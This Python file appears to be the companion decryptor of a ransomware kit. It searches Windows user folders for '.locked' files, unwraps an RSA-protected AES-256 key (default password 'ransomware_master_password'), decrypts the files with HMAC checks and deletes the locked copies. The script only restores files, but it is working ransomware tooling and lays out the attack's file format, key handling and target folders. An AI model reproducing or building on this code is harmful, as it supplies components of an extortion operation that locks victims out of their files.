import os
from pathlib import Path
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.backends import default_backend
import base64

class AdvancedDecryptionTraversal:
    def __init__(self, max_workers=4, rsa_private_key=None, encrypted_aes_key=None):
        """
        Initialize the parallel BFS traversal with AES-256 + RSA decryption.
        
        Args:
            max_workers: Number of parallel threads to use
            rsa_private_key: RSA private key object
            encrypted_aes_key: RSA-encrypted AES key (bytes)
        """
        self.max_workers = max_workers
        self.lock = threading.Lock()
        self.all_files = []
        self.decrypted_count = 0
        self.failed_count = 0
        self.skipped_count = 0
        self.backend = default_backend()
        
        # Store RSA private key
        self.rsa_private_key = rsa_private_key
        
        # Decrypt the AES key using RSA private key
        if encrypted_aes_key and rsa_private_key:
            self.aes_key = self.decrypt_aes_key_with_rsa(encrypted_aes_key)
        else:
            self.aes_key = None
    
    def decrypt_aes_key_with_rsa(self, encrypted_key):
        """
        Decrypt the AES key using RSA private key.
        
        Args:
            encrypted_key: RSA-encrypted AES key (bytes)
            
        Returns:
            Decrypted AES key (bytes)
        """
        try:
            decrypted_key = self.rsa_private_key.decrypt(
                encrypted_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted_key
        except Exception as e:
            print(f"Error decrypting AES key: {e}")
            return None
    
    def get_windows_directories(self):
        """Get the standard Windows user directories."""
        home = Path.home()
        
        directories = {
            'Documents': home / 'Documents',
            'Desktop': home / 'Desktop',            
            'Downloads': home / 'Downloads',
            'Music': home / 'Music',
            'Videos': home / 'Videos',
            'Pictures': home / 'Pictures',
            'AppData_Roaming': home / 'AppData' / 'Roaming'
        }
        
        # Filter out directories that don't exist
        existing_dirs = {}
        for name, path in directories.items():
            if path.exists():
                existing_dirs[name] = path
        
        return existing_dirs
    
    def decrypt_file_aes256(self, filepath, dir_name):
        """
        Decrypt a single .locked file using AES-256-CBC.
        
        File format: [IV (16 bytes)][Encrypted Data][HMAC (32 bytes)]
        
        Args:
            filepath: Path object of the .locked file
            dir_name: Name of the parent directory (for logging)
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Only process .locked files
            if filepath.suffix != '.locked':
                with self.lock:
                    self.skipped_count += 1
                return False
            
            # Check if we have the AES key
            if self.aes_key is None:
                print(f"[{dir_name}] Cannot decrypt: AES key not available")
                with self.lock:
                    self.failed_count += 1
                return False
            
            # Read encrypted file
            with open(filepath, 'rb') as file:
                encrypted_data = file.read()
            
            # Extract components: [IV][Ciphertext][HMAC]
            iv = encrypted_data[:16]
            hmac_stored = encrypted_data[-32:]
            ciphertext = encrypted_data[16:-32]
            
            # Verify HMAC (integrity check)
            from cryptography.hazmat.primitives import hmac
            h = hmac.HMAC(self.aes_key, hashes.SHA256(), backend=self.backend)
            h.update(iv + ciphertext)
            
            try:
                h.verify(hmac_stored)
            except Exception:
                print(f"[{dir_name}] HMAC verification failed for {filepath.name}")
                with self.lock:
                    self.failed_count += 1
                return False
            
            # Decrypt with AES-256-CBC
            cipher = Cipher(
                algorithms.AES(self.aes_key),
                modes.CBC(iv),
                backend=self.backend
            )
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove PKCS7 padding
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            
            # Restore original filename (remove .locked extension)
            original_filename = str(filepath)[:-7]  # Remove '.locked'
            
            # Write decrypted data
            with open(original_filename, 'wb') as file:
                file.write(plaintext)
            
            # Delete the .locked file
            os.remove(filepath)
            
            print(f"[{dir_name}] Decrypted: {filepath.name} → {Path(original_filename).name}")
            
            with self.lock:
                self.decrypted_count += 1
            
            return True
            
        except PermissionError:
            print(f"[{dir_name}] Permission denied: {filepath.name}")
            with self.lock:
                self.failed_count += 1
            return False
        except Exception as e:
            print(f"[{dir_name}] Decryption failed for {filepath.name}: {e}")
            with self.lock:
                self.failed_count += 1
            return False
    
    def bfs_traverse_directory(self, root_dir, dir_name):
        """
        Perform BFS traversal on a single directory and decrypt .locked files.
        
        Args:
            root_dir: Root directory path to traverse
            dir_name: Name of the directory (for logging)
        
        Returns:
            List of all file paths found
        """
        files_found = []
        queue = deque([root_dir])
        visited = set()
        
        print(f"\n[{dir_name}] Starting traversal of: {root_dir}")
        
        while queue:
            current_dir = queue.popleft()
            
            # Skip if already visited
            try:
                real_path = current_dir.resolve()
                if real_path in visited:
                    continue
                visited.add(real_path)
            except (OSError, RuntimeError):
                continue
            
            try:
                # Get all items in current directory
                items = list(current_dir.iterdir())
                
                for item in items:
                    try:
                        if item.is_file():
                            # Decrypt if it's a .locked file
                            if item.suffix == '.locked':
                                self.decrypt_file_aes256(item, dir_name)
                                
                                # Track the file
                                original_path = str(item)[:-7]
                                if os.path.exists(original_path):
                                    files_found.append(original_path)
                                    with self.lock:
                                        self.all_files.append({
                                            'directory': dir_name,
                                            'locked_path': str(item),
                                            'decrypted_path': original_path,
                                            'size': os.path.getsize(original_path)
                                        })
                                else:
                                    files_found.append(str(item))
                                    with self.lock:
                                        self.all_files.append({
                                            'directory': dir_name,
                                            'locked_path': str(item),
                                            'decrypted_path': None,
                                            'size': item.stat().st_size if item.exists() else 0
                                        })
                            else:
                                files_found.append(str(item))
                                
                        elif item.is_dir():
                            queue.append(item)
                    except (PermissionError, OSError):
                        pass
                        
            except PermissionError:
                print(f"[{dir_name}] Permission denied: {current_dir}")
            except OSError as e:
                print(f"[{dir_name}] Error accessing {current_dir}: {e}")
        
        print(f"[{dir_name}] Completed. Processed {len(files_found)} files.")
        return files_found
    
    def traverse_all_parallel(self):
        """
        Traverse all Windows directories in parallel and decrypt .locked files.
        
        Returns:
            Dictionary with results from each directory
        """
        directories = self.get_windows_directories()
        
        if not directories:
            print("No valid directories found to traverse.")
            return {}
        
        print(f"\nStarting parallel BFS traversal with decryption ({self.max_workers} workers)...")
        print(f"Directories to traverse: {', '.join(directories.keys())}\n")
        
        results = {}
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_dir = {
                executor.submit(self.bfs_traverse_directory, path, name): name
                for name, path in directories.items()
            }
            
            for future in as_completed(future_to_dir):
                dir_name = future_to_dir[future]
                try:
                    files = future.result()
                    results[dir_name] = files
                except Exception as e:
                    print(f"Error traversing {dir_name}: {e}")
                    results[dir_name] = []
        
        return results
    
    def print_summary(self, results):
        """Print a summary of the decryption results."""
        print("\n" + "="*70)
        print("DECRYPTION SUMMARY")
        print("="*70)
        
        total_files = 0
        total_size = 0
        
        for dir_name, files in results.items():
            file_count = len(files)
            total_files += file_count
            print(f"\n{dir_name}:")
            print(f"  Files processed: {file_count:,}")
        
        for file_info in self.all_files:
            total_size += file_info['size']
        
        print(f"\n{'='*70}")
        print(f"TOTAL FILES PROCESSED: {total_files:,}")
        print(f"SUCCESSFULLY DECRYPTED: {self.decrypted_count:,}")
        print(f"FAILED: {self.failed_count:,}")
        print(f"SKIPPED (not .locked): {self.skipped_count:,}")
        print(f"TOTAL SIZE: {total_size:,} bytes ({total_size / (1024**3):.2f} GB)")
        print(f"{'='*70}\n")


def load_rsa_private_key(key_path, password=None):
    """
    Load RSA private key from PEM file.
    
    Args:
        key_path: Path to the private key file
        password: Password to decrypt the private key (bytes)
        
    Returns:
        RSA private key object
    """
    try:
        with open(key_path, 'rb') as f:
            private_key = serialization.load_pem_private_key(
                f.read(),
                password=password,
                backend=default_backend()
            )
        return private_key
    except Exception as e:
        print(f"Error loading private key: {e}")
        return None


def load_encrypted_aes_key(key_path):
    """
    Load the RSA-encrypted AES key.
    
    Args:
        key_path: Path to the encrypted AES key file
        
    Returns:
        Encrypted AES key (bytes)
    """
    try:
        with open(key_path, 'rb') as f:
            encrypted_key = f.read()
        return encrypted_key
    except Exception as e:
        print(f"Error loading encrypted AES key: {e}")
        return None


def main():
    """Main function - decrypt files encrypted with AES-256 + RSA."""
    
    print("="*70)
    print("AES-256 + RSA Decryption Tool")
    print("="*70)
    print()
    
    # Get RSA private key
    print("Step 1: Load RSA Private Key")
    print("-" * 70)
    
    # Try default location first
    default_key_path = Path.home() / '.encryption_private.pem'
    
    if default_key_path.exists():
        print(f"Found private key at: {default_key_path}")
        use_default = input("Use this key? (y/n) [y]: ").strip().lower()
        
        if use_default != 'n':
            key_path = default_key_path
        else:
            key_path = input("Enter path to RSA private key (.pem): ").strip()
            key_path = Path(key_path)
    else:
        key_path = input("Enter path to RSA private key (.pem): ").strip()
        key_path = Path(key_path)
    
    if not key_path.exists():
        print(f"Error: Private key not found at {key_path}")
        return
    
    # Load private key with password
    password = input("Enter private key password [ransomware_master_password]: ").strip()
    if not password:
        password = "ransomware_master_password"
    
    private_key = load_rsa_private_key(key_path, password.encode())
    
    if private_key is None:
        print("Failed to load private key. Check password and file.")
        return
    
    print("✓ Private key loaded successfully!")
    print()
    
    # Get encrypted AES key
    print("Step 2: Load Encrypted AES Key")
    print("-" * 70)
    
    # Try default location
    default_aes_key = Path.home() / 'Desktop' / 'ENCRYPTED_AES_KEY.bin'
    
    if default_aes_key.exists():
        print(f"Found encrypted AES key at: {default_aes_key}")
        use_default = input("Use this key? (y/n) [y]: ").strip().lower()
        
        if use_default != 'n':
            aes_key_path = default_aes_key
        else:
            aes_key_path = input("Enter path to encrypted AES key (.bin): ").strip()
            aes_key_path = Path(aes_key_path)
    else:
        aes_key_path = input("Enter path to encrypted AES key (.bin): ").strip()
        aes_key_path = Path(aes_key_path)
    
    if not aes_key_path.exists():
        print(f"Error: Encrypted AES key not found at {aes_key_path}")
        return
    
    encrypted_aes_key = load_encrypted_aes_key(aes_key_path)
    
    if encrypted_aes_key is None:
        print("Failed to load encrypted AES key.")
        return
    
    print("✓ Encrypted AES key loaded successfully!")
    print()
    
    # Confirm decryption
    print("="*70)
    print("Ready to decrypt files")
    print("="*70)
    print()
    print("This will:")
    print("  1. Decrypt the AES-256 key using RSA private key")
    print("  2. Find all .locked files")
    print("  3. Decrypt each file with AES-256-CBC")
    print("  4. Verify integrity with HMAC-SHA256")
    print("  5. Restore original filenames")
    print("  6. Delete .locked files")
    print()
    
    confirm = input("Type 'DECRYPT' to confirm and proceed: ").strip()
    
    if confirm != 'DECRYPT':
        print("Operation cancelled.")
        return
    
    print()
    
    # Create decryption instance
    decryptor = AdvancedDecryptionTraversal(
        max_workers=4,
        rsa_private_key=private_key,
        encrypted_aes_key=encrypted_aes_key
    )
    
    if decryptor.aes_key is None:
        print("Error: Failed to decrypt AES key with RSA private key!")
        print("The private key may be incorrect or the encrypted key is corrupted.")
        return
    
    print("✓ AES-256 key decrypted successfully!")
    print(f"  Key: {decryptor.aes_key.hex()[:32]}... ({len(decryptor.aes_key)} bytes)")
    print()
    
    # Perform parallel traversal and decryption
    results = decryptor.traverse_all_parallel()
    
    # Print summary
    decryptor.print_summary(results)
    
    print("Decryption complete!")
    print()
    print("Your files have been restored to their original state.")


if __name__ == "__main__":
    main()
